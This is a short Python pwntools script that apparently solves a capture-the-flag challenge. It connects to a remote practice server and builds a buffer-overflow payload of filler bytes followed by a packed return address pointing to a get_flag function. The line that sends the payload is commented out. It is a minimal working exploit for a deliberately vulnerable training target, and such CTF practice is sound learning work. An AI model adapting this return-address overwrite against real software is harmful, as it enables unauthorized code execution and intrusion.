from pwn import *

# context.log_level = 'debug'
s = remote('node3.buuoj.cn', 26327)

get_flag_addr = 0x08048f0d
payload = b'I'*20+b'a'*4+p32(get_flag_addr)
# s.sendline(payload)
s.interactive()


